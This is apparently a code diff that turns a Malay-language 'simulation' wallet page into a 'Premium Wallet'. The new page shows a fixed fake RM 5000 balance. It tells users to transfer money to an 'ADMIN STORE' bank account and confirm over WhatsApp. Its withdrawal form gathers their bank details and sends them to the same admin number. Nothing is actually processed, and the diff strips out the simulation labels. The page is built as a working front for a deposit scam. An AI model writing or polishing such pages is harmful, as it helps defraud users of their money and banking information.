@@ -3,38 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wallet</title>
+<title>Premium Wallet</title>
 
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 
 body{
     background:#000;
     color:white;
 }
 
-/* NAV */
-.nav{
-    display:flex;
-    background:#111;
-}
-.nav button{
-    flex:1;
-    padding:15px;
-    border:none;
-    background:none;
-    color:#aaa;
-    font-weight:bold;
-}
-.nav button.active{
-    color:#fff;
-    border-bottom:2px solid #22c55e;
-}
-
 /* HEADER */
 .header{
     padding:20px;
     font-weight:bold;
+    font-size:18px;
     color:#22c55e;
 }
 
@@ -42,7 +25,7 @@ body{
 .card{
     margin:15px;
     padding:20px;
-    border-radius:15px;
+    border-radius:20px;
     background:#111;
 }
 
@@ -50,6 +33,7 @@ body{
 .balance{
     font-size:30px;
     margin-top:10px;
+    font-weight:bold;
 }
 
 /* INPUT */
@@ -60,9 +44,10 @@ body{
     width:100%;
     padding:15px;
     border:none;
-    border-radius:10px;
+    border-radius:12px;
     background:#222;
     color:white;
+    margin-bottom:10px;
 }
 
 /* BUTTON */
@@ -71,69 +56,70 @@ body{
     padding:15px;
     width:calc(100% - 30px);
     border:none;
-    border-radius:10px;
+    border-radius:12px;
     font-weight:bold;
 }
 .green{background:#22c55e;}
 .red{background:#ef4444;}
+.wa{background:#25D366;}
 
-/* SECTION */
-.section{display:none;}
-.show{display:block;}
+/* BOX */
+.box{
+    margin:15px;
+    padding:15px;
+    background:#111;
+    border-radius:15px;
+    display:none;
+}
 </style>
+
 </head>
 <body>
 
-<div class="header">SIMULASI WALLET</div>
+<div class="header">PREMIUM WALLET</div>
 
-<div class="nav">
-    <button class="active" onclick="showTab('wallet')">Wallet</button>
-    <button onclick="showTab('trading')">Trading</button>
-</div>
-
-<!-- WALLET -->
-<div id="wallet" class="section show">
-
+<!-- SALDO -->
 <div class="card">
-    <div>Baki (Simulasi)</div>
-    <div class="balance">RM <span id="saldo">0</span></div>
+    <div>Baki Akaun</div>
+    <div class="balance">RM <span id="saldo">5000</span></div>
 </div>
 
+<!-- INPUT -->
 <div class="input">
-    <input type="number" id="jumlah" placeholder="Masukkan deposit">
+    <input type="number" id="jumlah" placeholder="Masukkan jumlah">
 </div>
 
-<button class="btn green" onclick="deposit()">Deposit</button>
+<!-- BUTTON -->
+<button class="btn green" onclick="topup()">Tambah Baki</button>
+<button class="btn red" onclick="showWithdraw()">Pengeluaran</button>
 
+<!-- TOPUP -->
+<div class="box" id="topupBox">
+    <p><b>Pindahan ke Admin</b></p>
+    <p>Bank: BRI</p>
+    <p>No Akaun: 1234567890</p>
+    <p>Nama: ADMIN STORE</p>
+    <p>Jumlah: RM <span id="nominal"></span></p>
+
+    <a id="waTopup" target="_blank">
+        <button class="btn wa">Chat WhatsApp Admin</button>
+    </a>
 </div>
 
-<!-- TRADING -->
-<div id="trading" class="section">
-<div class="card">
-    <div>Harga (Simulasi)</div>
-    <div class="balance">RM <span id="price">100</span></div>
-</div>
+<!-- WITHDRAW -->
+<div class="box" id="withdrawBox">
+    <input type="number" id="wdJumlah" placeholder="Jumlah">
+    <input type="text" id="wdBank" placeholder="Nama Bank">
+    <input type="text" id="wdRek" placeholder="Nombor Akaun">
+    <input type="text" id="wdNama" placeholder="Nama Pemilik Akaun">
+
+    <button class="btn wa" onclick="submitWithdraw()">Hantar Permintaan</button>
 </div>
 
 <script>
 
-let saldo = 0;
-let price = 100;
-let growthInterval = null;
-
-/* TAB */
-function showTab(tab){
-    document.getElementById("wallet").classList.remove("show");
-    document.getElementById("trading").classList.remove("show");
-
-    document.getElementById(tab).classList.add("show");
-
-    let buttons = document.querySelectorAll(".nav button");
-    buttons.forEach(b=>b.classList.remove("active"));
-
-    if(tab==="wallet") buttons[0].classList.add("active");
-    else buttons[1].classList.add("active");
-}
+let saldo = 5000;
+const noAdmin = "6285183034790";
 
 /* FORMAT */
 function formatRM(x){
@@ -143,44 +129,61 @@ function formatRM(x){
 /* UPDATE */
 function update(){
     document.getElementById("saldo").innerText = formatRM(saldo);
-    document.getElementById("price").innerText = formatRM(price);
 }
 
-/* DEPOSIT */
-function deposit(){
+/* TOPUP */
+function topup(){
     let j = parseInt(document.getElementById("jumlah").value);
 
     if(!j){
-        alert("Masukkan jumlah");
+        alert("Masukkan jumlah!");
         return;
     }
 
-    saldo += j;
-    update();
+    document.getElementById("topupBox").style.display="block";
+    document.getElementById("withdrawBox").style.display="none";
 
-    startGrowth();
+    document.getElementById("nominal").innerText = formatRM(j);
 
-    alert("Deposit berjaya (SIMULASI)");
+    let msg = `Halo admin,
+Saya ingin tambah baki RM ${formatRM(j)}.
+
+Sila sahkan pembayaran saya.`;
+
+    document.getElementById("waTopup").href =
+    `https://wa.me/${noAdmin}?text=${encodeURIComponent(msg)}`;
 }
 
-/* AUTO GROWTH */
-function startGrowth(){
-    if(growthInterval) return;
-
-    growthInterval = setInterval(()=>{
-        let naik = Math.floor(Math.random()*5)+1;
-        saldo += naik;
-        update();
-    },3000);
+/* SHOW WITHDRAW */
+function showWithdraw(){
+    document.getElementById("withdrawBox").style.display="block";
+    document.getElementById("topupBox").style.display="none";
 }
 
-/* HARGA NAIK TURUN */
-setInterval(()=>{
-    let change = Math.random()*4 - 2;
-    price += change;
-    if(price < 1) price = 1;
-    update();
-},2000);
+/* SUBMIT WITHDRAW */
+function submitWithdraw(){
+    let j = document.getElementById("wdJumlah").value;
+    let b = document.getElementById("wdBank").value;
+    let r = document.getElementById("wdRek").value;
+    let n = document.getElementById("wdNama").value;
+
+    if(!j || !b || !r || !n){
+        alert("Sila lengkapkan semua maklumat!");
+        return;
+    }
+
+    let msg = `Halo admin,
+Saya ingin pengeluaran.
+
+Jumlah: RM ${formatRM(j)}
+Bank: ${b}
+No Akaun: ${r}
+Nama: ${n}
+
+Mohon diproses.`;
+
+    window.open(`https://wa.me/${noAdmin}?text=${encodeURIComponent(msg)}`);
+}
 
 update();
 
